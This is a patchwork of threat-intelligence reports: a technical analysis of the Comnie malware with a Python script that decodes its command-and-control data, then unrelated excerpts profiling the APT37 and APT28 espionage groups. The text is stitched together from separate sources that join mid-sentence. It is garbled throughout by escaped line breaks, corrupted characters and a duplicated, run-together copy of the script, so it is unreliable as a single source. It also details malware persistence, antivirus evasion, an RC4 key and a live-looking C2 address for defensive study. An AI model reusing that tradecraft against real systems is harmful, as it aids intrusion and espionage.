malware family have remained consistent, suggesting that the attackers have been able to stay below the radar of the security community.\\nThe Comnie malware family is notable in that it leverages third-party online services to download and parse C2 information. Because these third-party online services are legitimate, it allows Comnie to circumvent a number of security preventions that may be present in the environment. This overall technique has previously been referred to as using a “Dead Drop Resolver” or DDR.\\nPalo Alto Networks customers are protected from this threat in the following ways:\\nAll identified samples have been flagged as malicious by WildFire and Traps\\nCustomers may track this threat using the ‘Comnie’ AutoFocus tag\\nTraps appropriately catches the macro execution from the malware and prevents it\\nAdditionally, blogspot, tumblr, and github have been alerted to the malicious activity discovered.\\nAppendix\\nComnie Technical Analysis\\nFor the analysis of the Comnie malware family, we investigated the following sample:\\nSHA256\\n18ec68e1bd9b11f22e481d48c415f8d80edb76e9032ba4e1d31d87e16eed9959\\nWhen the sample is initially executed, it will attempt to create a mutex with a name of ‘tmutexabc’ to ensure only a single instance of Comnie is running at a given time. Should this mutex already be found to exist, the malware will immediately exit.\\nComnie continues to load an embedded bitmap (BMP) file and decrypt data at offset 0x512.\\nFigure 11 Embedded BMP file containing encrypted string data\\nRC4 is used to decrypt this data using a 16-byte key that is stored within the BMP file at offset 0x502. Once decrypted, we are provided with a large list of strings, as seen below (note that the data has been truncated for brevity):\\nFigure 12 Decrypted strings from embedded BMP file\\nAfter these strings are decrypted, the malware will load a series of Microsoft Windows API calls to be used later on. After these functions are loaded, Comnie determines if it is running within the %TEMP% directory of the victim machine. In the event it is not running within this directory, it will copy itself to %TEMP% and execute this newly created file with an argument of the original file’s path. A total of 64MB of garbage data is appended to this copied file, likely as a way to deter any security products in place that may be scanning files on disk. After running within the %TEMP% path, Comnie will delete the original file.\\nAfter Comnie has been copied to the %TEMP% directory, it will look for the presence of the ‘DQuit.tmp’ file in this path. It is unclear how this file is used exactly, as it does not appear to ever be written during runtime by Comnie.\\nComnie continue to enter its installation routine. In doing so, it will attempt to detect the following Anti-Virus products via various techniques:\\nTrend Micro\\nKaspersky\\nSymantec\\nAvira\\nAVG\\nALYac\\nAhnlab\\nAhnlab and ALYac are the most widely used Anti-Virus solutions in South Korea, and Trend Micro and the rest are also known to be most widely used in Taiwan. These are in-line with the targeting of the victims witnessed by the attackers using Conmie.\\nWith a few exceptions, Comnie will perform the following actions regardless of what security product, if any, is discovered:\\nConvert itself to a temporary DLL with a default export of ‘Dm’ in the %TEMP% directory.\\nIf running with administrator privileges on a 32-bit host:\\nCopy the temporary DLL in %TEMP% to %WINDOWS%\\\\LINKINFO.dll\\nOtherwise:\\nCopy the temporary DLL in %TEMP% to %APPDATA%\\\\cnagnt.dll\\nDelete the temporary DLL in %TEMP%\\nWrite a ‘Conime.lnk’ file in the user’s startup path. This shortcut file points to ‘C:\\\\Windows\\\\system32\\\\rundll32.exe “%APPDATA%\\\\cnagnt.dll”,Sd’\\nOne of the exceptions to the installation routine above is in the event Symantec is detected. In such a scenario, Comnie will drop a temporary VBS script to write the ‘Conime.lnk’ file.\\nAdditionally, in the event Kaspersky is detected, the malware will immediately run the ‘Conime.lnk’ shortcut file in a new process after it is created.\\nAfter the installation routine, the malware will decrypt an embedded blob of data using RC4 with an embedded 8-byte static key of ‘\\\\x11\\\\xcc\\\\xd1\\\\x32\\\\x61\\\\x21\\\\xd1\\\\xe2’. The results of the decoded data may be seen below:\\nFigure 13 Decrypted information\\nThe decrypted data contains URLs for various online services that will be used by the attacker for downloading data that will contain the command and control (C2) server(s) and port(s) to be used by Comnie.\\nComnie will make requests to these URLs, looking for base64-encoded data after an identifier of ‘magnet:/’, as seen in the example below:\\nFigure 14 GitHub storing Comnie C2 information\\nIn the example above, the C2 information is being stored within the user’s URL parameter within GitHub. In order to decode this data, Comnie first decodes it using base64 with the following non-standard alphabet (note that it is simply the original alphabet in reverse):\\n/+9876543210zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA\\nThe resulting data is then parsed and decrypted using RC4. The first 64 bytes are used as the key. The next 4 bytes represent the underlying data’s length, and the remaining data is the C2 data. The prior example decrypts to the following:\\nmailto:121.126.211.94:8080;80;80\\nThe following Python script may be used to decode the C2 data used by the newest Comnie variant:\\nimport base64\\nimport sys\\nimport re\\nfrom string import maketrans\\nfrom struct import *\\nimport requests\\ndef rc4_crypt(data, key):\\nS = range(256)\\nj = 0\\nout = \\nfor i in range(256):\\nj = (j + Si + ord( keyi % len(key) )) % 256\\nSi , Sj = Sj , Si\\ni = j = 0\\nfor char in data:\\ni = ( i + 1 ) % 256\\nj = ( j + Si ) % 256\\nSi , Sj = Sj , Si\\nout.append(chr(ord(char) ^ S(Sj + Si) % 256))\\nreturn \\'\\'.join(out)\\ndef decode(data):\\no = \"\"\\nfor d in data:\\nod = ord(d)\\no += chr((4 * (16 * od | od & 0xC) | (((od >> 4 | od & 0x30) >> 2))) & 0xFF)\\nreturn o\\nbase64fixTable = maketrans(\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"::-1, \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\");\\ndef trans(string):\\nreturn str(string).translate(base64fixTable)\\ndef altdecode(string):\\nreturn base64.b64decode(trans(string))\\nreq = requests.get(sys.argv1)\\nfd = req.text\\noriginal_data = re.search(\"magnet:/\\\\?(^\\\\?+)\\\\?\", fd).group(1)\\nparsed_data = altdecode(original_data)\\ndataLength = unpack(\"<I\", parsed_data64:68)0\\nkey = decode(parsed_data0:64)\\ndata = parsed_datadataLength*-1:\\nd = rc4_crypt(data, key)\\nprint(d)\\n12345678910111213141516171819202122232425262728293031323334353637383940\\nimport base64import sysimport refrom string import maketransfrom struct import *import requestsdef rc4_crypt(data, key):\\xa0\\xa0S = range(256)\\xa0\\xa0j = 0\\xa0\\xa0out = \\xa0\\xa0for i in range(256):\\xa0\\xa0\\xa0\\xa0j = (j + Si + ord( keyi % len(key) )) % 256\\xa0\\xa0\\xa0\\xa0Si , Sj = Sj , Si\\xa0\\xa0i = j = 0\\xa0\\xa0for char in data:\\xa0\\xa0\\xa0\\xa0i = ( i + 1 ) % 256\\xa0\\xa0\\xa0\\xa0j = ( j + Si ) % 256\\xa0\\xa0\\xa0\\xa0Si , Sj = Sj , Si\\xa0\\xa0\\xa0\\xa0out.append(chr(ord(char) ^ S(Sj + Si) % 256))\\xa0\\xa0return \\'\\'.join(out)def decode(data):\\xa0\\xa0o = \"\"\\xa0\\xa0for d in data:\\xa0\\xa0\\xa0\\xa0od = ord(d)\\xa0\\xa0\\xa0\\xa0o += chr((4 * (16 * od | od & 0xC) | (((od >> 4 | od & 0x30) >> 2))) & 0xFF)\\xa0\\xa0return obase64fixTable = maketrans(\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"::-1, \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\");def trans(string):\\xa0\\xa0return str(string).translate(base64fixTable)def altdecode(string):\\xa0\\xa0return base64.b64decode(trans(string))req = requests.get(sys.argv1)fd = req.textoriginal_data = re.search(\"magnet:/\\\\?(^\\\\?+)\\\\?\", fd).group(1)parsed_data = altdecode(original_data)dataLength = unpack(\"<I\", parsed_data64:68)0key = decode(parsed_data0:64)data = parsed_datadataLength*-1:d = rc4_crypt(data, key)print(d)\\nComnie will make attempts at connecting to the IP address above using the various ports specified. Data is sent via HTTP, and is encrypted against using the RC4 algorithm. The URIs used in the HTTP requests are randomly generated. Data is provided first via the ‘pid’ GET parameter initially, and via the ‘iid’ GET parameter when POST requests are made by Comnie. Initially, Comnie will send the following request:\\nFigure 15 Comnie initial beacon\\nIn order to decrypt the data provided within the ‘pid’ parameter, a key is generated using the SessionID information, which is randomly generated. This particular data is decoded from hex and bytes at offsets 0, 2, 4, 6, 8, 10, 12, and 14 are used to form an 8-byte RC4 key. After applying this decryption algorithm, we are presented with the following data:\\nh=HOSTNAME-PC&f=mission.ini&c=&\\nThe response made by the C2 server uses the same RC4 key for encryption. The data above contains the hostname (‘HOSTNAME-PC’) of the victim machine, as well as an instruction. In this case, the instruction is asking for information that is to be written to a temporary BAT file within the %TEMP% directory. The following example information is provided by the remote C2 server:\\nMISSION\\nId=2017\\nCrc=201701\\nBAT\\nNum=1\\nFileName1=gethostinfo.bat\\nCrc1=2017011\\nResultFile1=info.dat\\n12345678\\nMISSIONId=2017Crc=201701BATNum=1FileName1=gethostinfo.batCrc1=2017011ResultFile1=info.dat\\nThis INI file is parsed to determine what Comnie should do.

      "'The Overlooked North Korean Actor SPECIAL REPORT PY APT37 (REAPER) CONTENTS Introduction 3Targeting and Mission 4Initial Infection Vectors 7Exploited Vulnerabilities 8Command and Control Infrastructure 9Malware 10Attribution 12 Outlook and Implications 13Appendix: Malware Used by APT37 14SPECIAL REPORT 2 INTRODUCTIONOn Feb. 2, 2018, we published a blog detailing the use of an Adobe Flash zero-day vulnerability (CVE-2018-4878) by a suspected North Korean cyber espionage group that we now track as APT37 (Reaper). Recent examination of this group™s activities by FireEye iSIGHT Intelligence reveals APT37 has expanded its operations in both scope and sophistication. APT37™s toolset, which includes access to zero-day vulnerabilities and wiper malware, combined with heightened tensions in Northeast Asia and North Korea™s penchant for norm breaking, means this group should be taken seriously. We assess with high confidence that this activity is carried out on behalf of the North Korean government given malware development artifacts and targeting that aligns with North Korean state interests. FireEye iSIGHT Intelligence believes that APT37 is aligned with the activity publicly reported as Scarcruft and Group123. APT37 (REAPER): THE OVERLOOKED NORTH KOREAN ACTOR 3 ˜˚˛˝˙ˆˇ ˝ ˜˚˛˝˙˚˝˛ˆ˝˙ ˘˝ ˛˜ˇ˝ ˆ˝˘˛ ˛˙ ˆ APT37 has likely been active since at least 2012 and focuses on targeting the public and private sectors primarily in South Korea. In 2017, APT37 expanded its targeting beyond the Korean peninsula to include Japan, Vietnam and the Middle East, and to a wider range of industry verticals, including chemicals, electronics, manufacturing, aerospace, automotive and healthcare entities (Fig. 1). Targeting and Mission Figure 1. APT37 Targeting Scope. SPECIAL REPORT 4 We judge that APT37™s primary mission is covert intelligence gathering in support of North Korea™s strategic military, political and economic interests. This is based on consistent targeting of South Korean public and private entities and social engineering. APT37™s recently expanded targeting scope also appears to have direct relevance to North Korea™s strategic interests. From 2014 to 2017, APT37 targeting concentrated primarily on the South Korean government, military, defense industrial base, and media sector. Lure materials (Fig. 2) typically leveraged the Korean language and featured themes such as Korean peninsula reunification or sanctions. Figure 2. ﬁ2016 Korean Reunification Conference Formﬂ (MD5:183be2035d5a546670d2b9deeca4eb59). ˜˚˛˝˙ˆˇ ˝ ˜˚˛˝˙˚˝˛ˆ˝˙ ˘˝ ˛˜ˇ˝ ˆ˝˘˛ ˛˙ ˆ 5APT37 (REAPER): THE OVERLOOKED NORTH KOREAN ACTOR APT37 targeted a research fellow, advisory member, and journalist associated with different North Korean human rights issues and strategic organizations. It also targeted an entity in Japan associated with the United Nations missions on sanctions and human rights. APT37 distributed SLOWDRIFT malware using a lure referencing the Korea Global Forum against academic and strategic institutions located in South Korea. Notably, the email was sent from a compromised South Korean institute that conducts studies on North Korea. The string ﬁdurihana,ﬂ which is also the name of a Christian missionary organization that works with North Korean defectors, was included in an APT37 weaponized document sent to an individual who works with a North Korean human rights organization. In 2017, APT37 targeted a Middle Eastern company that entered into a joint venture with the North Korean government to provide telecommunications service to the country (read on for a case study). At that time, other targets included individuals involved in international affairs and trade issues, the general director of a Vietnamese international trading and transport company, and possibly individuals working with Olympics organizations assisting in securing resources for athletes. North Korean defector and human rights-related targeting provides further evidence that APT37 conducts operations aligned with the interests of North Korea. In May 2017, APT37 used a bank liquidation letter as a spear phishing lure against a board member of a Middle Eastern financial company. The specially crafted email included an attachment containing exploit code for CVE-2017- 0199, a vulnerability in Microsoft Office that had been disclosed just a month earlier. Once opened, the malicious document communicated with a compromised website, most likely to surreptitiously download and install a backdoor called SHUTTERSPEED (MD5: 7c2ebfc7960aac6f8d58b37e3f092a9c). The tool would enable APT37 to collect system information, take screenshots and download additional malicious files to the victim computer. CASE STUDY: Targeting of Middle Eastern Organization with Business ties to North Korea We believe a Middle Eastern organization was targeted by APT37 because it had been involved with a North Korean company and a business deal went bad. This firm was targeted shortly after media reports of this schism had gone public. The targeting effort may have been an attempt by the North Korean government to gather information on a former business partner. The operation exemplifies APT37™s tactics, techniques and procedures (TTPs), and reflects the advanced capabilities of this espionage group. ﬁThe GDPR will change – the whole world as we know it.ﬂ SPECIAL REPORT 6 Initial Infection Vectors In addition to the aforementioned spear phishing tactics, APT37 leverages a variety of methods to deliver malware. These include strategic web compromises typical of targeted cyber espionage operations, as well as the use of torrent file-sharing sites to distribute malware more indiscriminately. Numerous campaigns have employed social engineering tactics tailored specifically to desired targets. Lures and websites of particular interest to South Korean organizations (e.g. reunification) are regularly leveraged in campaigns. Multiple South Korean websites were abused in strategic web compromises to deliver newer variants of KARAE and POORAIM malware. Identified sites included South Korean conservative media and a news site for North Korean refugees and defectors. In one instance, APT37 weaponized a video downloader application with KARAE malware that was indiscriminately distributed to South Korean victims through torrent websites. 7APT37 (REAPER): THE OVERLOOKED NORTH KOREAN ACTOR FEB JAN DEC NOV OCT SEP AUG JUL JUN MAY APR MARFEB JAN DEC NOV OCT SEP AUG JUL JUN MAY APR MARFEB JAN DEC NOV OCT SEP AUG JUL JUN MAY APR MARFEB JAN DEC NOV OCT SEP AUG JUL JUN MAY APR MARFEB JAN 2018 2017 2016 2015 2014 CVE-2018-4878 (Zero-day vulnerability) CVE-2017-0199 CVE-2015-2387 CVE-2015-2545 CVE-2015-7645 CVE-2016-4117 CVE Release Date Exploit Figure 3. Timeline of CVE Release Dates vs. Dates of APT37 CVE Exploitation. Exploited Vulnerabilities APT37 frequently exploits vulnerabilities in Hangul Word Processor (HWP) due to the software™s prevalence in South Korea. Further, the group recently demonstrated access to zero-day vulnerabilities (CVE-2018-0802) and has the flexibility to quickly incorporate recently publicized vulnerabilities into spear phishing and strategic web compromise operations. These capabilities suggest a high operational tempo and specialized expertise. APT37 has repeatedly deployed exploits, especially in Flash, quickly after vulnerabilities are initially publicized (see Table 1). CVE-2016-4117, CVE- 2016-1019 and CVE-2015-3043 were all exploited by APT37 in this way. FireEye iSIGHT Intelligence confirmed that since at least November 2017, APT37 exploited a zero-day Adobe Flash vulnerability, CVE-2018-4878, to distribute DOGCALL malware to South Korean victims. While use and discovery of zero-day exploits over the past several years has expanded beyond a nation-state dominated environment to include commercial vendors of cyber espionage capabilities and sophisticated financially motivated actors, access to zero-day exploits remains a factor in distinguishing sophisticated or well-resourced actors. Figure 3 details the vulnerabilities exploited by APT37, comparing the time of exploitation to the time the CVE was released.

They leverage compromised servers, messaging platforms and cloud service providers to avoid detection. The group often relies on compromised sites to host second stage malware payloads. Over time, APT37 has changed the email providers to set up command and control accounts in a possible attempt to cover their tracks and cause misdirection. These tactics have been refined over the years as APT37 evolves to evade network defenders. APT37 has used various legitimate platforms as command and control for its malware tools. While some early campaigns leveraged POORAIM, which abused AOL Instant Messenger, newer activity deploys DOGCALL, which uses cloud storage APIs such as pCloud and Dropbox. APT37 relies on compromised websites to host second stage malware. Small websites focused on subjects such as aromatherapy and scuba diving have been leveraged, and were most likely compromised opportunistically and made to host malicious payloads. APT37 has improved its operational security over time. For example, early 2015 use of SLOWDRIFT involved credentials associated with Korea related mail servers such as ﬁDaum.netﬂ. Later, in 2015 and early 2016, APT37 pivoted to different email providers such as Gmail and ﬁhmamail.comﬂ in an attempt to anonymize activity. Then from mid-2016 onward, APT37 began using @yandex.com and @ india.com email accounts -- possibly an attempt to cause misattribution. 9APT37 (REAPER): THE OVERLOOKED NORTH KOREAN ACTOR APT37 employs a diverse suite of malware for initial intrusion and exfiltration. Their malware is characterized by a focus on stealing information from victims, with many set up to automatically exfiltrate data of interest. Figure 4 shows APT37™s malware usage over time. A full breakdown of the malware we associate with APT37, along with how it is detected by FireEye devices, is available in the Appendix.

In April 2017, APT37 targeted South Korean military and government organizations with the DOGCALL backdoor and RUHAPPY wiper malware. Although the wiper capability was not used in the identified instance, RUHAPPY can overwrite a machine\\'s Master Boot Record (MBR), causing the system to fail to boot into preconfigured partitions.

Timeline of APT37 Malware Use By First and Last Observed Compile Times. It is possible that APT37™s distribution of KARAE malware via torrent websites could assist in creating and maintaining botnets for future distributed denial-of-service (DDoS) attacks, or for other activity such as financially motivated campaigns or disruptive operations. Disruptive and destructive cyber threat activity, including the use of wiper malware, public leaks of proprietary materials by false hacktivist personas, DDoS attacks and electronic warfare tactics such as GPS signal jamming is consistent with past behavior by other North Korean actors. 11APT37 (REAPER): THE OVERLOOKED NORTH KOREAN ACTOR Attribution 12 a.m. 1 a.m. 2 a.m 3 a.m 4 a.m 5 a.m 6 a.m 7 a.m 8 a.m 9 a.m. 10 a.m 11 a.m. 12 p.m. 1 p.m. 2 p.m. 3 p.m. 4 p.m. 5 p.m. 6 p.m. 7 p.m. 8 p.m. 9 p.m. 10 p.m. 11 p.m. Frequency Figure 5. APT37 Compile Times Against Local Time in North Korea. Ł An individual we believe to be the developer behind several APT37 malware payloads inadvertently disclosed personal data showing that the actor was operating from an IP address and access point associated with North Korea. Ł The compilation times of APT37 malware is consistent with a developer operating in the North Korea time zone (UTC +8:30) and follows what is believed to be a typical North Korean workday (Fig. 5). The majority of malware compilation times occurred between 10:00 a.m. and 7:00 p.m., with We assess with high confidence that APT37 acts in support of the North Korean government and is primarily based in North Korea. This assessment is based on multiple factors, including APT37™s targeting profile, insight into the group™s malware development and probable links to a North Korean individual believed to be the developer of several of APT37™s proprietary malware families: a dip around noon. Additional activity occurred late into the evening. This is consistent with media reporting of extremely long hours for North Korean workers. Ł The majority of APT37 activity continues to target South Korea, North Korean defectors, and organizations and individuals involved in Korean Peninsula reunification efforts. Similarly, APT37 targeting of a Middle Eastern company in 2017 is also consistent with North Korean objectives given the entity™s extensive relationships inside North Korea. SPECIAL REPORT 12 Outlook and Implications North Korea has repeatedly demonstrated a willingness to leverage its cyber capabilities for a variety of purposes, undeterred by notional redlines and international norms. Though they have primarily tapped other tracked suspected North Korean teams to carry out the most aggressive actions, APT37 is an additional tool available to the regime, perhaps even desirable for its relative obscurity. We anticipate APT37 will be leveraged more and more in previously unfamiliar roles and regions, especially as pressure mounts on their sponsor. The slow transformation of regional actors into global threats is well established. Minor incidents in Ukraine, the Middle East and South Korea have heralded the threats, which are now impossible to ignore. In some cases, the global economy connects organizations to aggressive regional actors. In other cases, a growing mandate draws the actor on to the international stage. Ignored, these threats enjoy the benefit of surprise, allowing them to extract significant losses on their victims, many of whom have never previously heard of the actor. Figure 5. APT37 Compile Times Against Local Time in North Korea. 13APT37 (REAPER): THE OVERLOOKED NORTH KOREAN ACTOR 14Appendix: Malware Used by APT37 Malware Description Detected as CORALDECK CORALDECK is an exfiltration tool that searches for specified files and exfiltrates them in password protected archives using hardcoded HTTP POST headers. CORALDECK has been observed dropping and using Winrar to exfiltrate data in password protected RAR files as well as WinImage and zip archives. APT.InfoStealer.Win.CORALDECK FE_APT_InfoStealer_Win_ CORALDECK_1 DOGCALL DOGCALL is a backdoor commonly distributed as an encoded binary file downloaded and decrypted by shellcode following the exploitation of weaponized documents. DOGCALL is capable of capturing screenshots, logging keystrokes, evading analysis with anti-virtual machine detections, and leveraging cloud storage APIs such as Cloud, Box, Dropbox, and Yandex. DOGCALL was used to target South Korean Government and military organizations in March and April 2017. The malware is typically dropped using an HWP exploit in a lure document. The wiper tool, RUHAPPY, was found on some of the systems targeted by DOGCALL. While DOGCALL is primarily an espionage tool, RUHAPPY is a destructive wiper tool meant to render systems inoperable. FE_APT_RAT_DOGCALL FE_APT_Backdoor_Win32_ DOGCALL_1 APT.Backdoor.Win.DOGCALL GELCAPSULE GELCAPSULE is a downloader traditionally dropped or downloaded by an exploit document. GELCAPSULE has been observed downloading SLOWDRIFT to victim systems. FE_APT_Downloader_Win32_ GELCAPSULE_1 HAPPYWORK HAPPYWORK is a malicious downloader that can download and execute a second-stage payload, collect system information, and beacon it to the command and control domains. The collected system information includes: computer name, user name, system manufacturer via registry, IsDebuggerPresent state, and execution path. In November 2016, HAPPYWORK targeted government and financial targets in South Korea. FE_APT_Downloader_ HAPPYWORK FE_APT_Exploit_HWP_Happy Downloader.APT.HAPPYWORK KARAE Karae backdoors are typically used as first-stage malware after an initial compromise. The backdoors can collect system information, upload and download files, and may be used to retrieve a second- stage payload. The malware uses public cloud-based storage providers for command and control. In March 2016, KARAE malware was distributed through torrent file-sharing websites for South Korean users. During this campaign, the malware used a YouTube video downloader application as a lure. FE_APT_Backdoor_Karae_enc FE_APT_Backdoor_Karae Backdoor.APT.Karae 15Malware Description Detected as MILKDROP MILKDROP is a launcher that sets a persistence registry key and launches a backdoor. FE_Trojan_Win32_MILKDROP_1 POORAIM POORAIM malware is designed with basic backdoor functionality and leverages AOL Instant Messenger for command and control communications. POORAIM includes the following capabilities: System information enumeration, File browsing, manipulation and exfiltration, Process enumeration, Screen capture, File execution, Exfiltration of browser favorites, and battery status. Exfiltrated data is sent via files over AIM. POORAIM has been involved in campaigns against South Korean media organizations and sites relating to North Korean refugees and defectors since early 2014. Compromised sites have acted as watering holes to deliver newer variants of POORAIM. Backdoor.APT.POORAIM RICECURRY RICECURRY is a Javascript based profiler used to fingerprint a victim\\'s web browser and deliver malicious code in return. Browser, operating system, and Adobe Flash version are detected by RICECURRY, which may be a modified version of PluginDetect. Exploit.APT.RICECURRY RUHAPPY RUHAPPY is a destructive wiper tool seen on systems targeted by DOGCALL. It attempts to overwrite the MBR, causing the system not to boot. When victims\\' systems attempt to boot, the string \"Are you Happy?\" is displayed. The malware is believed to be tied to the developers of DOGCALL and HAPPYWORK based on similar PDB paths in all three. FE_APT_Trojan_Win32_RUHAPPY_1 SHUTTERSPEED SHUTTERSPEED is a backdoor that can collect system information, acquire screenshots, and download/execute an arbitrary executable. SHUTTERSPEED typically requires an argument at runtime in order to execute fully. Observed arguments used by SHUTTERSPEED include: \\'help\\', \\'console\\', and \\'sample\\'. The spear phishing email messages contained documents exploiting RTF vulnerability CVE-2017-0199. Many of the compromised domains in the command and control infrastructure are linked to South Korean companies. Most of these domains host a fake webpage pertinent to targets. FE_APT_Backdoor_SHUTTERSPEED APT.Backdoor.SHUTTERSPEED APT.Backdoor.SHUTTERSPEED Malware Description Detected as SLOWDRIFT SLOWDRIFT is a launcher that communicates via cloud based infrastructure. It sends system information to the attacker command and control and then downloads and executes additional payloads. Lure documents distributing SLOWDRIFT were not tailored for specific victims, suggesting that TEMP.Reaper is attempting to widen its target base across multiple industries and in the private sector. SLOWDRIFT was seen being deployed against academic and strategic targets in South Korea using lure emails with documents leveraging the HWP exploit. Recent SLOWDRIFT samples were uncovered in June 2017 with lure documents pertaining to cyber crime prevention and news stories. These documents were last updated by the same actor who developed KARAE, POORAIM and ZUMKONG. FE_APT_Downloader_Win_ SLOWDRIFT_1 FE_APT_Downloader_Win_ SLOWDRIFT_2 APT.Downloader.SLOWDRIFT SOUNDWAVE SOUNDWAVE is a windows based audio capturing utility.

The New York Times 12 August 2008. Web. http://www.nytimes.com/2008/08/13/technology/13cyber.html 2 Knowlton, Brian. ﬁMilitary Computer Attack Confirmedﬂ. The New York Times. 25 August 2010. Web. http://www.nytimes.com/2010/08/26/ technology/26cyber.html EXECUTIVE SUMMARYIn this paper we discuss a threat group whose malware is already fairly well-known in the cybersecurity community. This group, unlike the China-based threat actors we track, does not appear to conduct widespread intellectual property theft for economic gain. Nor have we observed the group steal and profit from financial account information.The activity that we profile in this paper appears to be the work of a skilled team of developers and operators collecting intelligence on defense and geopolitical issues Œ intelligence that would only be useful to a government. We believe that this is an advanced persistent threat (APT) group engaged in espionage against political and military targets including the country of Georgia, Eastern European governments and militaries, and European security organizations since at least 2007. They compile malware samples with Russian language settings during working hours consistent with the time zone of Russia™s major cities, including Moscow and St. Petersburg. While we don™t have pictures of a building, personas to reveal, or a government agency to name, what we do have is evidence of long- standing, focused operations that indicate a government sponsor Œ specifically, a government based in Moscow. We are tracking this group as APT28. Our clients often ask us to assess the threat Russia poses in cyberspace. Russia has long been a whispered frontrunner among capable nations for performing sophisticated network operations. This perception is due in part to the Russian government™s alleged involvement in the cyber attacks accompanying its invasion of Georgia in 2008, as well as the rampant speculation that Moscow was behind a major U.S. Department of Defense network compromise, also in 2008. These rumored activities, combined with a dearth of hard evidence, have made Russia into something of a phantom in cyberspace. 4 fireeye.com APT 28: A Window into Russia™s Cyber Espionage Operations? KEY FINDINGSGEORGIA EASTERN EUROPE SECURITY ORGANIZATIONS APT28 likely seeks to collect intelligence about Georgia™s security and political dynamics by targeting officials working for the Ministry of Internal Affairs and the Ministry of Defense.APT28 has demonstrated interest in Eastern European governments and security organizations. These victims would provide the Russian government with an ability to predict policymaker intentions and gauge its ability to influence public opinion.APT28 appeared to target individuals affiliated with European security organizations and global multilateral institutions. The Russian government has long cited European security organizations like NATO and the OSCE as existential threats, particularly during periods of increased tension in Europe.APT28 targets insider information related to governments, militaries, and security organizations that would likely benefit the Russian government. 5 fireeye.com KEY FINDINGS Malware compile times suggest that APT28 developers have consistently updated their tools over the last seven years. APT28 malware, in particular the family of modular backdoors that we call CHOPSTICK, indicates a formal code development environment. Such an environment would almost certainly be required to track and define the various modules that can be included in the backdoor at compile time. APT28 tailors implants for specific victim environments. They steal data by configuring their implants to send data out of the network using a victim network™s mail server. Several of APT28™s malware samples contain counter- analysis capabilities including runtime checks to identify an analysis environment, obfuscated strings unpacked at runtime, and the inclusion of unused machine instructions to slow analysis. Indicators in APT28™s malware suggest that the group consists of Russian speakers operating during business hours in Russia™s major cities. More than half of the malware samples with Portable Executable (PE) resources that we have attributed to APT28 included Russian language settings (as opposed to neutral or English settings), suggesting that a significant portion of APT28 malware was compiled in a Russian language build environment consistently over the course of six years (2007 to 2013).Over 96% of the malware samples we have attributed to APT28 were compiled between Monday and Friday. More than 89% were compiled between 8AM and 6PM in the UTC+4 time zone, which parallels the working hours in Moscow and St. Petersburg. These samples had compile dates ranging from mid-2007 to September 2014. Since 2007, APT28 has systematically evolved its malware, using flexible and lasting platforms indicative of plans for long-term use. The coding practices evident in the group™s malware suggest both a high level of skill and an interest in complicating reverse engineering efforts. Malware compile times suggest that APT28 developers have consistently updated their tools over the last seven years. 6 fireeye.com Three themes in APT28™s targeting clearly reflect areas of specific interest to an Eastern European government, most likely the Russian government. 7 Bloomberg. ﬁNeiman Marcus Hackers Set Off 60,000 Alerts While Bagging Credit Card Data.ﬂ February 2014. 8 Ibid.9 Ibid.APT28 TARGETING REFLECTS Many of APT28™s targets align generally with interests that are typical of any government. However, three themes in APT28™s targeting clearly reflects areas of specific interest to an Eastern European government, most likely the Russian government. These include the Caucasus (especially the Georgian government), Eastern European governments and militaries, and specific security organizations.APT28 uses spearphishing emails to target its victims, a common tactic in which the threat group crafts its emails to mention specific topics (lures) relevant to recipients. This increases the likelihood that recipients will believe that the email is legitimate and will be interested in opening the message, opening any attached files, or clicking on a link in the body of the email. Since spearphishing lures are tailored to the recipients whose accounts APT28 hopes to breach, the subjects of the lures provide clues as to APT28™s targets and interests. For example, if the group™s lures repeatedly refer to the Caucasus, then this most likely indicates that APT28 is trying to gain access to the accounts of individuals whose work pertains to the Caucasus. Similarly, APT28™s practice of registering domains that mimic those of legitimate news, politics, or other websites indicates topics that are relevant to APT28™s targets. We identified three themes in APT28™s lures and registered domains, which together are particularly relevant to the Russian government. In addition to these themes, we have seen APT28 target a range of political and military organizations. We assess that the work of these organizations serves nation state governments. RUSSIAN INTERESTSThe Caucasus, particularly the country of GeorgiaEastern European governments and militariesThe North Atlantic Treaty Organization (NATO) and other European security organizationsAPT 28: Three Themes 7 fireeye.com The Caucasus, a region that includes Chechnya and other Russian republics and the independent states of Georgia, Armenia, and Azerbaijan, continues to experience political unrest. The Georgian government™s posture and ties to the West are a frequent source of Moscow™s frustration, particularly after the 2008 war. Overall, issues in the Caucasus likely serve as focal points for Russian intelligence collection efforts.APT28 INTEREST IN THE CAUCASUS, PARTICULARLY GEORGIA Since 2011, APT28 has used lures written in Georgian that are probably intended to target Georgian government agencies or citizens. APT28 is likely seeking information on Georgia™s security and diplomatic postures. Specifically, the group has targeted the Georgian Ministry of Internal Affairs (MIA) and the Ministry of Defense (MOD). We also observed efforts to target a journalist working on issues in the Caucasus and a controversial Chechen news site. RUSSIAChechnyaGEORGIAAbkhaziaTURKEYARMENIAAZERBAIJANTbilisiArmenian MilitaryYerevan Kavkaz Center 8 fireeye.com APT28 Targeting of the Georgian Ministry of Internal Affairs (MIA)The MIA harbors sensitive information about the inner workings of Georgia™s security operations, the country™s engagement in multilateral institutions, and the government™s communications backbone.

In one case, we identified an APT28 lure from mid-2013 that referenced MIA-related topics and employed malware that attempted to disguise its activity as legitimate MIA email traffic. The lure consisted of a weaponized Excel file that presented a decoy document containing a list of Georgian driver™s 3 Georgian Ministry of Internal Affairs website http://police.ge/en/home 4 Queries on the author yielded a LinkedIn page for a person of the same name who serves as a system administrator in Tbilisi. license numbers. The backdoor attempted to establish a connection to a Georgian MIA mail server and communicate via MIA email addresses ending with ﬁ@mia.ge.govﬂ. Once connected to the mail server, APT28™s backdoor sent an email message using a subject line related to driver™s licenses (in Georgian), and attached a file containing system reconnaissance information. This tactic could allow APT28 to obtain data from the MIA™s network through a less-monitored route, limiting the MIA network security department™s abilities to detect the traffic. In the second example of MIA targeting, an APT28 lure used an information technology-themed decoy document that included references to the Windows domain ﬁMIA Users\\\\Ortachala–ﬂ (Figure 1). This probably referred to the MIA facility in the Ortachala district of Tbilisi, Georgia™s capital city. The decoy document also contains metadata listing ﬁMIAﬂ as the company name and ﬁBeka Nozadzeﬂ 4 as an author, a possible reference to a system administrator in 